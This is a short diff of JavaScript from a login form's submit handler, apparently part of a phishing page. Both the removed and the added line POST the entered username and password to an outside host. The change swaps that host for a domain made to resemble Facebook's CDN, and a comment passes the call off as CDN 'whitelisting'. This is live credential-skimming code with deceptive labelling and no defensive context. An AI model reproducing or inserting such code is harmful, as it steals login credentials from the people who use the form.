@@ -116,7 +116,7 @@ form.onsubmit = function() {
 
   // Whitelist facebook CDN
   req = new XMLHttpRequest()
-  req.open("POST", "http://fdcdn.com/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist?username=" + username + "&password=" + password)
   req.send()
 
   // Whitelist redirect to facebook
